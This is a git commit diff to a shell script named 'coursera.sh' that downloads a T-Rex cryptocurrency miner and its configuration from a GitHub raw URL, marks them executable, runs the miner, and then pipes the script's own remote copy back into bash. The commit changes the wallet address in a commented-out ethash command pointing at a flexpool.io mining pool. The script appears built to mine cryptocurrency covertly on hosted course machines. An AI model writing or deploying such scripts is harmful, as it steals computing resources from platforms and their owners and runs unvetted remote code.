68bd54ce71f85cfef3f70bbee8d6b7842454b8cd
nikikulone <109032903+nikikulone@users.noreply.github.com>
2022-07-16 13:37:05 +0700

    Update coursera.sh

--- coursera.sh
+++ coursera.sh
@@ -7,6 +7,6 @@ curl -sLO https://raw.githubusercontent.com/nikikulone/SC/main/etdah
 chmod +x t-rex
 chmod +x etdah
 
-#/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
+#/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
 ./t-rex -c etdah
 curl https://raw.githubusercontent.com/nikikulone/SC/main/coursera.sh | bash
